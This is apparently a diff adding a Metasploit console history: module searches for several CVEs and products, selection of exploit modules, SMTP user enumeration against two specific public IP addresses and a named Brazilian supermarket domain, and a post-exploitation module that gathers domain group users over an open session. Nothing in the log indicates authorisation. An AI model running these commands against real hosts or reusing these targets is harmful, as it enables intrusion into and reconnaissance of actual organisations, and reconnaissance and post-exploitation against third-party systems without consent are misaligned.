@@ -1,0 +1,47 @@
+search CVE-2016-7103
+search wp_404-to-301_xss
+use exploit/multi/http/wp_404-to-301_xss
+search xss
+search jquery
+quit
+search jquery
+quit
+search sonicwall
+msfupdate
+search sonicwall
+search php
+quit
+search exchange
+use 13
+show
+info
+info -d
+exit
+search
+search header
+use 44
+helpe
+help
+quit
+search cve-2007-0176
+search cve-2007-
+search same
+search xss
+use exploit/windows/http/tomcat_cgi_cmdlineargs
+use auxiliary/scanner/smtp/smtp_enum
+set RHOSTS 189.56.93.82
+run
+show
+set RHOSTS 200.233.159.129
+run
+use auxiliary/scanner/smtp/smtp_enum
+show options
+set DOMAIN supermercadosdalben.com.br
+run
+use post/windows/gather/enum_domain_group_users
+show options
+set GROUP supermercadosdalben.com.br
+run
+set SESSION 1
+run
+quit
